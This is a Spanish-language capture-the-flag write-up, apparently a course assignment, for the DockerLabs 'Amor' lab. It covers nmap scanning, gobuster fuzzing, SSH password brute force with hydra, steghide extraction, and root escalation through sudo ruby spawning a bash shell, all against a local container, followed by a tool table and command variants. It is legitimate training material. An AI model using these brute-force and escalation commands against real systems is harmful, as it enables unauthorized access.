# <p align="center">Reto Amor - DockerLabs ✨</p>
**<p align="center">My. Uribe Vergara Carlos Augusto</p>**

---

## Introducción
DockerLabs es una plataforma que ofrece una serie de desafíos prácticos relacionados con Docker, organizados por niveles de dificultad. En esta oportunidad, se abordará el reto "Amor" clasificado como **Fácil**, utilizando herramientas esenciales en ciberseguridad ofensiva como `nmap`, `hydra`, `gobuster`, `steghide`, entre otras.

---

## **Taller Individual**

**1.** Realizar una investigación individual de cada una de las herramientas empleadas. Sintetice el resultado mediante un cuadro que explique su definición, funcionalidad y casos de uso.

**2.** Explicar en detalle cada uno de los comandos empleados realizando un desglose del mismo y citando al menos tres alternativas (si aplica) de variantes del comando.

**3.** Realice un diagrama de flujo de todo el procedimiento realizado.

---
## Requisitos Previos
- Sistema Kali Linux (actualizado).
- Docker instalado.
- Conectividad en red con la máquina host y la DockerLab.
- Wordlists comunes (`rockyou.txt`, `directory-list-2.3-medium.txt`).

---

## Despliegue del laboratorio

### Paso 1: Transferencia de archivos desde la host
```bash
scp -r amor kali@192.168.1.12:/home/kali/Documents/
```

### Paso 2: Instalación de Docker (si no está instalado)
```bash
sudo apt install docker.io
```

### Paso 3: Ejecución del script de despliegue
```bash
cd Documents/amor
chmod +x auto_deploy.sh
./auto_deploy.sh amor.tar
```

---

## Escaneo y reconocimiento

### Paso 4: Ver interfaz de red
```bash
ip add
```

### Paso 5: Descubrimiento de hosts
```bash
sudo netdiscover -i docker0 -r 172.17.0.0/24
```

### Paso 6: Escaneo de puertos y servicios
```bash
sudo nmap --min-rate 5000 -p- -sS -sV 172.17.0.2
```

---

## Fuzzing Web
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

---

## Fuerza bruta SSH con Hydra
```bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
```

---

## Acceso a SSH y exploración
```bash
ssh carlota@172.17.0.2
cd /carlota/Desktop/fotos/vacaciones
```

### Transferencia de la imagen a Kali
```bash
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor
```

---

## Análisis de archivo e ingeniería inversa

### Tipo de archivo
```bash
file imagen.jpg
```

### Extracción con esteganografía
```bash
steghide --extract -sf imagen.jpg
```

### Decodificación de base64
```bash
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo
```

### Escalada de privilegios
```bash
su oscar
sudo -l
sudo /usr/bin/ruby -e 'exec "/bin/bash"'
whoami
```

---

## 1. Cuadro de herramientas utilizadas

Una vez desplegado el laboratorio y explicado el paso a paso del mismo, ahora podemos explicar las herramientas utilizadas, así:


| Herramienta     | Definición                                                                 | Funcionalidad principal                                                     | Casos de uso comunes                                      |
|-----------------|----------------------------------------------------------------------------|------------------------------------------------------------------------------|------------------------------------------------------------|
| `nmap`          | Network Mapper, escáner de red.                                           | Descubrir hosts, puertos abiertos y servicios en red.                       | Pentesting, auditorías de red, reconocimiento.           |
| `hydra`         | Herramienta de fuerza bruta de logins.                                     | Realizar ataques por diccionario a servicios como SSH, FTP, HTTP, etc.     | Test de credenciales, CTF, auditorías de acceso.          |
| `gobuster`      | Buscador de directorios y archivos ocultos en aplicaciones web.            | Enumerar directorios, recursos y endpoints ocultos.                         | Fuzzing web, test de exposición.                         |
| `steghide`      | Herramienta para ocultar y extraer archivos dentro de imágenes o audio.   | Esteganografía: ocultar/extraer información.                                | CTF, análisis forense, canales encubiertos.               |
| `scp`           | Secure Copy Protocol.                                                      | Transferencia de archivos remota por SSH.                                    | Carga/descarga de recursos, backup seguro.                |
| `docker.io`     | Plataforma de contenedores para despliegue y prueba de servicios.          | Ejecutar entornos aislados reproducibles.                                    | DevOps, laboratorios, pruebas de seguridad.               |
| `base64`        | Codificador/decodificador base64.                                          | Transformar texto para transmisiones o almacenamiento.                      | Decodificación de mensajes, CTF, criptografía básica.     |
| `sudo`/`ruby`   | Escalada de privilegios / ejecución de scripts con permisos.               | Ejecutar comandos como root / crear shell interactivo.                      | Post-explotación, privilege escalation.                   |
| `unzip`         | Herramienta de descompresión de archivos ZIP.                             | Extraer el contenido de archivos .zip.                                      | Manejo de recursos comprimidos, despliegue de laboratorios.|
| `chmod`         | Comando para cambiar permisos de archivos.                               | Otorgar o restringir permisos de ejecución, lectura, escritura.             | Preparación de scripts, hardening básico.                 |
| `ip add`        | Comando para ver configuración de red.                                   | Muestra interfaces, direcciones IP y estado.                                | Reconocimiento, troubleshooting de red.                   |
| `file`          | Determina el tipo de archivo.                                             | Identifica el formato y codificación de archivos.                           | Análisis forense, validación de extensiones.              |
| `ssh`           | Protocolo seguro para acceso remoto.                                     | Conectarse a sistemas de manera cifrada.                                    | Administración remota, pentesting.                        |
| `netdiscover`   | Herramienta de descubrimiento de hosts en red.                           | Muestra IPs activas, MACs y vendors conectados a la red.                    | Reconocimiento de red, pentesting, inventario.            |

---

## 2. Variantes de Comandos Empleados

A continuación, se describen variantes técnicas de cada herramienta utilizada en el laboratorio, seleccionando aquellas que realizan funciones equivalentes a las ejecutadas en el entorno práctico:

### `nmap`
- `sudo nmap -sS -p- 172.17.0.2`
- `sudo nmap -p 1-65535 -T4 -sV 172.17.0.2`
- `sudo nmap -sS --min-rate=10000 -vv -p- 172.17.0.2`

### `hydra`
- `hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`
- `hydra -L users.txt -P pass.txt ssh://172.17.0.2`
- `hydra -l carlota -p password123 ssh://172.17.0.2`

### `gobuster`
- `gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
- `gobuster dir -u http://172.17.0.2 -w wordlist.txt -t 30`
- `gobuster dir -u http://172.17.0.2 -w wordlist.txt -x .php,.txt`

### `steghide`
- `steghide extract -sf imagen.jpg`
- `steghide --extract -sf imagen.jpg -p ""`
- `steghide --info imagen.jpg`

### `scp`
- `scp carlota@172.17.0.2:/ruta/archivo /home/kali/`
- `scp -r directorio/ user@ip:/destino`
- `scp -i clave.pem archivo user@ip:/destino`

### `unzip`
- `unzip amor.zip`
- `unzip -d /home/kali/Documents amor.zip`
- `unzip -o archivo.zip`

### `chmod`
- `chmod +x auto_deploy.sh`
- `chmod 700 archivo`
- `chmod u+x archivo`

### `ip add`
- `ip add`
- `ip a`
- `ip addr show docker0`

### `file`
- `file imagen.jpg`
- `file -b imagen.jpg`
- `file /home/*/*.jpg`

### `ssh`
- `ssh carlota@172.17.0.2`
- `ssh -p 22 carlota@172.17.0.2`
- `ssh -o StrictHostKeyChecking=no carlota@172.17.0.2`

### `netdiscover`
- `netdiscover -i docker0 -r 172.17.0.0/24`
- `netdiscover -r 192.168.1.0/24`
- `netdiscover -p`

---

## 3. Diagrama de flujo del procedimiento

<p align="center">
  <img src="Imagenes/Diagrama LAB.png">
</p>

---

## Conclusión
Este ejercicio práctico permite aplicar técnicas de reconocimiento, explotación y escalada de privilegios dentro de un entorno aislado usando Docker. Es ideal para fortalecer las competencias de pentesting, esteganografía y gestión de herramientas de ciberseguridad en un escenario realista.

---

## Fuentes
- [https://dockerlabs.es](https://dockerlabs.es)
- [https://nmap.org](https://nmap.org)
- [https://github.com/OJ/gobuster](https://github.com/OJ/gobuster)
- [https://tools.kali.org/password-attacks/hydra](https://tools.kali.org/password-attacks/hydra)
- [https://linux.die.net/man/1/steghide](https://linux.die.net/man/1/steghide)
- [https://github.com](https://github.com)
